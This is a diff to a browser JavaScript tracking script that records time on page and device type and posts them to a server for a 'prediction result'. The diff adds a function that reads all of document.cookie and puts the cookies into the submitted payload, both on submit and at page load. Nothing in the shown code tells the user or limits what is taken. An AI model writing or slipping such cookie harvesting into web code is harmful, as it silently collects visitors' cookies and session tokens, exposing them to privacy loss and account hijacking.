@@ -68,6 +68,15 @@ function logTimeSpent() {
   timeSpent = endTime - startTime;
 }
 
+// Function to capture cookies
+function getCookies() {
+  return document.cookie.split(";").reduce((cookies, item) => {
+    const [name, value] = item.trim().split("=");
+    cookies[name] = value;
+    return cookies;
+  }, {});
+}
+
 // Function to submit the collected data
 function submit() {
   logTimeSpent();
@@ -93,6 +102,7 @@ function submit() {
       deviceType: /Mobi|Tablet/.test(navigator.userAgent)
         ? "Mobile/Tablet"
         : "Desktop",
+      cookies: getCookies(),  // Adding captured cookies here
     },
   };
 
@@ -108,15 +118,7 @@ function submit() {
   .then(result => {
     console.log('Success:', result);
 
-    /*
-    //  webpage pe result dikhane ke liye (optional)
-    const resultDiv = document.createElement('div');
-    resultDiv.textContent = `Server response: ${result.message}`;
-    document.body.appendChild(resultDiv);
-    */
-
-
-    // prediction result alert karke dikhane ke liye (comment/uncomment as needed)
+    // Prediction result alert (optional)
     alert(result.predictionResult); 
 
   })
@@ -140,5 +142,6 @@ window.onload = function () {
     deviceType: /Mobi|Tablet/.test(navigator.userAgent)
       ? "Mobile/Tablet"
       : "Desktop",
+    cookies: getCookies(),  // at the time when page load hoga, cookie will be retrieved
   };
 };
